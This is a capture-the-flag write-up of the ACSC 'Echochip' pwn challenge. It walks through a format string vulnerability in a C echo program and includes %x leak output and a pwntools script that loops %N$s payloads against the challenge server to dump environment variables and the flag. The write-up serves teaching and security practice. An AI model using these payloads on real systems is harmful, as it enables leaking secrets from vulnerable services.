---
author: Aryt3
pubDatetime: 2025-05-01T17:00:00Z
title: ACSC Echochip Writeup
slug: acsc-echochip
featured: true
draft: false
tags:
  - ACSC
  - pwn
description:
  A Writeup and Walkthrough of the ACSC Echochip challenge.
---


# Echochip

## Description
```
Soundboards are so 2076, get the new Kiroshi Echochip to add a cool echo, that will help establish your authority.
```

## Provided Files
```
- Echochip.zip
```

## Writeup

Starting off, I inspected the provided `c` program. <br/>
```c
// gcc Echochip.c -Wl,-z,relro,-z,now -Wall -o Echochip

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MIN(x, y) (x < y ? x : y)
char flag[0x100] = "dach2025{NOT_THE_FLAG}";

void setup(void) {
  char *flag_env = getenv("FLAG");
  if (flag_env == NULL)
    return;

  strncpy(flag, flag_env, sizeof(flag) - 1);
}

int main(int argc, char *argv[]) {
  char echo[0x200] = {0};
  char input[0x100] = {0};
  char *input_start, *echo_start;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setup();
  printf("Please input the message to echo: \n");
  fgets(input, sizeof(input), stdin);

  input_start = input;
  echo_start = echo;
  for (int i = 0; i < sizeof(input) && input[i] != 0; ++i) {
    if (input[i] == ' ' || input[i] == '\n') {
      int echo_len = MIN(3, &input[i] - input_start);
      memcpy(echo_start, input_start, &input[i] - input_start);
      echo_start += &input[i] - input_start;
      memcpy(echo_start, &input[i - echo_len], echo_len + 1);
      echo_start += echo_len + 1;
      input_start = &input[i + 1];
    }
  }

  printf(echo);
}
```

The thing that instantly caught my eye was the `printf` function which actually takes our direct input without any checks. <br/>
Knowing this, we can try for a `string formatting vulnerability`. <br/>
```sh
$ ./share/Echochip 
Please input the message to echo: 
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
a78252e.e1ae3080.a78252e.0.0.e1ae34b8.28.0.27.e1ae30a7.e1ae31aa.252e7825.2e78252e.78252e78
```

As we can I see in the output, we are leaking data from the stack. <br/>
The thing that interests me the most is that the flag is being read from an `env-var`. <br/>
`char *flag_env = getenv("FLAG");` this indicates that the string should be loaded into memory at some point. <br/>

Knowing this, we can actually check for strings by leaking the stack `position by position` using a `string-formatter`. <br/>
```sh
$ python3 bruteforce.py
-----
147  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin7$s

148  
HOSTNAME=a8415c1597e18$s

149  
FLAG=dach2025{NOT_THE_FLAG}9$s

150  
HOME=/home/ctf0$s

151  
SOCAT_PID=19811$s

152  
SOCAT_PPID=12$s

153  
SOCAT_VERSION=1.7.4.13$s

154  
SOCAT_SOCKADDR=172.19.0.24$s

155  
SOCAT_SOCKPORT=50005$s

156  
SOCAT_PEERADDR=172.19.0.16$s

157  
SOCAT_PEERPORT=562547$s
-----
``` 

There we can see all `environment-variables` as well as the `test-flag`. <br/>
These are loaded into the memory of the binary and that's the reason we can leak them. <br/>
With all this information we can now exploit it on the server and get the actual flag. <br/>

```py
from pwn import *

context.log_level = 'error'

for i in range(145,160):
    payload = f"%{i}$s".encode()

    p = remote('port.dyn.acsc.land', 34241)
    p.sendlineafter(b'Please input the message to echo:', payload)

    res = p.recvall().decode('latin-1')

    if 'dach' in res:
        print(res)

    p.close()
```

Executing the script reveals the flag which concludes this writeup. <br/>
```sh
$ python3 offset.py 
[*] '/home/aryt3/Hacking/CTFs/acsc_qualy_2025/Echochip/share/Echochip'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
  
FLAG=dach2025{d0es_th1s_m4ke_my_v01ce_s0und_deep3r_rimycu6vrt3m0nne}2$s